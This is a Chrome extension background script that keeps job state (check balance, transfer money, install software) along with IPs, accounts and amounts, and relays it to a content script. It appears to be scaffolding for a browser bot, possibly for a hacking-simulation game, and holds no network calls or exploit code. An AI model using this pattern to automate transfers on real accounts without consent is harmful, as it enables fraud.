//=========BACKGROUND SCRIPT=============//

//This structure stores the data for transmission
var requestData = {
	act : null,
	stepId : null,
	url: null,
	ip : [], 
	account : [],
	amount: null,
	language: null,
	job: null,
	counter: null,
	myAccount: null,
	software: null
}

//This estructure stores the default actions
var defaultAct = {
	getRequestData : 1,
	setRequestData : 2
}

//This stores the default job
var defaultJob = {
	checkBalance : 1,
	transferMoney : 2,
	installSoftware : 3,
	wait : 4
}

//#################################################################
//#################################################################
//#################################################################

requestData.stepId = "chooseJob";
requestData.job = defaultJob.checkBalance;

//It sends messages to content script
function sendRequest(request, tabId){
	chrome.tabs.sendMessage(tabId, {message: request}, function(response) {console.log(response.backMessage);}); 
};

//It listens for messages comming from content script
chrome.runtime.onMessage.addListener(
 	function(request, sender, sendResponse) {
    	sendResponse({backMessage: "Ok. Request data received by background script"});
   		handleRequest(request, sender.tab.id);
   	}
);

//It handles messages comming from content script
function handleRequest(request, tabId){
	showRequest(request);
	switch(request.message.act){
		case defaultAct.getRequestData:
			requestData.act = defaultAct.setRequestData;
			sendRequest(requestData, tabId); //Transmit the request data
			break;	
		case defaultAct.setRequestData:
			requestData = request.message; //Stores the request data
			break;

		default: break;
	}
			
};


//#################################################################
//#################################################################
//#################################################################

//Show request content
function showRequest(request){
	var data = request.message;
	console.log("Request>>> ACTION:" + 
				(data.act == defaultAct.getRequestData ? "getRequestData" : "setRequestData") + 
				" STEPID: " + data.stepId + 
				" URL: " + data.url +
				" IPS: " + data.ip[0] + " " + data.ip[1] +
				" ACCOUNTS: " + data.account[0] + " " + data.account[1] +
				" AMOUNT: " + data.amount);
};

